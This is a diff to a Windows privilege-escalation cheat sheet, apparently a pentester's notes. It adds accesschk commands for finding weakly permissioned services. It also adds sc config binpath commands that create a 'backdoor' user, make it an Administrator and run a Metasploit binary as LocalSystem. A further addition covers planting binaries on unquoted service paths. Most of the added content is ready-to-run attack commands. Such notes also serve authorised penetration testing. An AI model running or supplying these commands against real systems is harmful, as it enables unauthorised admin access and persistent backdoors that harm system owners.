@@ -88,6 +88,26 @@ net start upnphost*
     Using meterpreter:
     *> exploit/windows/local/service_permissions*
 
+    If wmic and sc is not available, you can use accesschk. For Windows XP, version 5.2 of accesschk is needed:
+    *https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe*
+    *$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+$ accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
+$ accesschk.exe -qdws Users C:\Windows\*
+    Then query the service using Windows sc:
+    *$ sc qc <vulnerable service name>*
+    Then change the binpath to execute your own commands (restart of the service will most likely be needed):
+    *$sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
+$ sc stop <vuln-service>
+$ sc start <vuln$ -service>
+$ sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>*
+
+    Note - Might need to use the depend attribute explicitly:
+    *$ sc stop <vuln-service>
+sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+sc start <vuln-service>*
+
 
 EoP2: Find unquoted paths
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
@@ -95,7 +115,11 @@ EoP2: Find unquoted paths
     For example, the following path would be vulnerable:
     *c:\Program Files\something\winamp.exe*
     We can place a binary like this
-    *c:\program.exe*
+    *c:\Program.exe*
+    *c:\Program Files.exe*
+
+    We might even be able to override the service executable, check out the permissions:
+    *$ icacls "C:\Program Files (x86)\Program Folder"*
 
     Using meterpreter
     *> exploit/windows/local/trusted_service_path*
